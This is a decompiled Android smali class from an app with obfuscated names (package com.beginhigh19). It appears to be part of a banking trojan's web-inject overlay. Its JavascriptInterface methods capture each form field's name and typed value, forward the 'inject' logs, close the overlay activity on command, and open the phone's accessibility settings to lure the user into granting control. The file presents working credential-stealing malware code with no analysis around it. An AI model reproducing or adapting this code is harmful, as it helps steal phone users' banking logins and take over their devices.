.class public Lcom/beginhigh19/p016j$ifdf;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/beginhigh19/p016j;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "ifdf"
.end annotation


# instance fields
.field fddo:Landroid/content/Context;

.field final synthetic for:Lcom/beginhigh19/p016j;

.field ifdf:Lfddo/class;


# direct methods
.method constructor <init>(Lcom/beginhigh19/p016j;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/beginhigh19/p016j$ifdf;->for:Lcom/beginhigh19/p016j;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p2, p0, Lcom/beginhigh19/p016j$ifdf;->fddo:Landroid/content/Context;

    new-instance p1, Lfddo/class;

    invoke-direct {p1, p2}, Lfddo/class;-><init>(Landroid/content/Context;)V

    iput-object p1, p0, Lcom/beginhigh19/p016j$ifdf;->ifdf:Lfddo/class;

    return-void
.end method


# virtual methods
.method public on_blur_send(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Field: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "; Value: "

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iget-object p2, p0, Lcom/beginhigh19/p016j$ifdf;->ifdf:Lfddo/class;

    iget-object v0, p0, Lcom/beginhigh19/p016j$ifdf;->for:Lcom/beginhigh19/p016j;

    invoke-static {v0}, Lcom/beginhigh19/p016j;->ifdf(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {p2, v0, p1, v1}, Lfddo/class;->case(Ljava/lang/String;Ljava/lang/String;Z)V

    return-void
.end method

.method public open_acsb_settings()V
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    iget-object v0, p0, Lcom/beginhigh19/p016j$ifdf;->fddo:Landroid/content/Context;

    invoke-static {v0}, Lfddo/goto;->dgjaertjardthjdgu(Landroid/content/Context;)V

    iget-object v0, p0, Lcom/beginhigh19/p016j$ifdf;->for:Lcom/beginhigh19/p016j;

    invoke-virtual {v0}, Lcom/beginhigh19/p016j;->try()V

    return-void
.end method

.method public send_log_injects(Ljava/lang/String;)V
    .locals 3
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    iget-object v0, p0, Lcom/beginhigh19/p016j$ifdf;->ifdf:Lfddo/class;

    iget-object v1, p0, Lcom/beginhigh19/p016j$ifdf;->for:Lcom/beginhigh19/p016j;

    invoke-static {v1}, Lcom/beginhigh19/p016j;->ifdf(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lfddo/class;->fddo(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/beginhigh19/p016j$ifdf;->ifdf:Lfddo/class;

    iget-object v1, p0, Lcom/beginhigh19/p016j$ifdf;->for:Lcom/beginhigh19/p016j;

    invoke-static {v1}, Lcom/beginhigh19/p016j;->ifdf(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v0, v1, p1, v2}, Lfddo/class;->case(Ljava/lang/String;Ljava/lang/String;Z)V

    const-string v0, "close_activity_injects"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/beginhigh19/p016j$ifdf;->for:Lcom/beginhigh19/p016j;

    invoke-virtual {p1}, Lcom/beginhigh19/p016j;->try()V

    :cond_0
    return-void
.end method
